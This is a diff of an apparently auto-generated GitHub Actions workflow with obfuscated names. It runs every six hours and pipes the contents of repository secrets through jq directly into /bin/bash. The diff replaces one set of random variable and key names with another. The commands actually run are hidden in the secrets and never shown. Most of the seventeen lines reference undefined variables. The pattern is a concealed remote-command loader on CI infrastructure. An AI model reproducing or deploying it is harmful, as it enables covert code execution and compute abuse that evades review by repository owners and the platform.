@@ -3,33 +3,33 @@ name: congbuiklqi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
+    - cron: '6 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: congbuiklqi
         env:
-          cmz97551: ${{ secrets.cmz97551 }}
+          wufp281: ${{ secrets.wufp281 }}
         run: |
-          echo $cmz97551 | jq -r .u3 | /bin/bash
-          echo $ludrc4 | jq -r .vu63880 | /bin/bash
-          echo $ch469 | jq -r .bw420 | /bin/bash
-          echo $tkxvz520 | jq -r .bc41937 | /bin/bash
-          echo $gfslw33 | jq -r .dekiz33530 | /bin/bash
-          echo $v70333 | jq -r .eohuc98 | /bin/bash
-          echo $viye2 | jq -r .swr55 | /bin/bash
-          echo $ul43354 | jq -r .fkl6 | /bin/bash
-          echo $gtqq500 | jq -r .swwlz06201 | /bin/bash
-          echo $dyfxx6 | jq -r .ulim28842 | /bin/bash
-          echo $zype71243 | jq -r .oy44 | /bin/bash
-          echo $z09014 | jq -r .xurh926 | /bin/bash
-          echo $uljaw52 | jq -r .ona52526 | /bin/bash
-          echo $au423 | jq -r .xugr03 | /bin/bash
-          echo $zowi3 | jq -r .y2697 | /bin/bash
-          echo $klvux092 | jq -r .l0505 | /bin/bash
-          echo $ipx9962 | jq -r .bniz6 | /bin/bash
-          echo $p79311 | jq -r .yg614 | /bin/bash
-          echo $juy31238 | jq -r .zsz8883 | /bin/bash
+          echo $wufp281 | jq -r .dtxnf51 | /bin/bash
+          echo $kpoxq2 | jq -r .qcxk90 | /bin/bash
+          echo $uk59173 | jq -r .gv994 | /bin/bash
+          echo $vijz6 | jq -r .aqac81047 | /bin/bash
+          echo $kffqm27 | jq -r .v4535 | /bin/bash
+          echo $yri66212 | jq -r .x46 | /bin/bash
+          echo $lbgmb228 | jq -r .iob4 | /bin/bash
+          echo $odtk048 | jq -r .zy2791 | /bin/bash
+          echo $ksyd0097 | jq -r .yoj9800 | /bin/bash
+          echo $dfdhg21101 | jq -r .zsniu4675 | /bin/bash
+          echo $wur4681 | jq -r .scb13710 | /bin/bash
+          echo $qfzh3 | jq -r .ekdl62468 | /bin/bash
+          echo $pxo776 | jq -r .hhr9818 | /bin/bash
+          echo $tbbgj74 | jq -r .ahtrp44 | /bin/bash
+          echo $ug73749 | jq -r .dho3 | /bin/bash
+          echo $rxm6 | jq -r .b9812 | /bin/bash
+          echo $dm481 | jq -r .tp53904 | /bin/bash
 
